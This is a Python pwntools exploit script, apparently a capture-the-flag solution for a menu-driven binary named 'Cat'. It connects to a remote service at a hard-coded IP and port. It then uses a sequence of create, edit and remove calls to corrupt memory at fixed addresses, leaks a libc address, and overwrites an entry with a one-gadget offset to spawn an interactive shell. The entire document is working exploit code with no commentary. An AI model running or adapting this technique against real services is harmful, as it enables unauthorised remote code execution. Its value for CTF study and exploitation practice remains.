from pwn import *

#r = process(["./Cat"])

r = remote("178.62.40.102", 6000)

def create(name,kind,age):
	r.sendlineafter(">","1")
	r.sendafter(">",name[:16])
	r.sendafter(">",kind[:16])
	r.sendafter(">",str(age)[:4])

def edit(idx,name,kind,age,modify):
	r.sendlineafter(">","2")
	r.sendlineafter(">",str(idx))
	r.sendafter(">",name[:16])
	r.sendafter(">",kind[:16])
	r.sendafter(">",str(age)[:4])
	if modify:
		r.sendlineafter(">","y")
	else:
		r.sendlineafter(">","n")

def show(idx):
	r.sendlineafter(">","3")
	r.sendlineafter(">",str(idx))

def showall():
	r.sendlineafter(">","4")


def remove(idx):
        r.sendlineafter(">","5")
        r.sendlineafter(">",str(idx))



create("abc","abc",10)

edit(0,"abc","abc",10,False)

create("abc",p64(0x6020a0),10)

create("abc",p64(0x6020a0),10)

edit(2,p64(0x602068),p64(0x602068),10,True)


show(1)

r.recvuntil("name: ")
libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x36e80

print hex(libc)


create("abc",p64(0x6020a0),10)
remove(3)
edit(0,"abc","abc",10,False)
create("abc",p64(0x0602038),10)




r.sendlineafter(">","2")
r.sendlineafter(">","0")

r.sendlineafter(">",p64(libc+0xf02a4))





r.interactive()
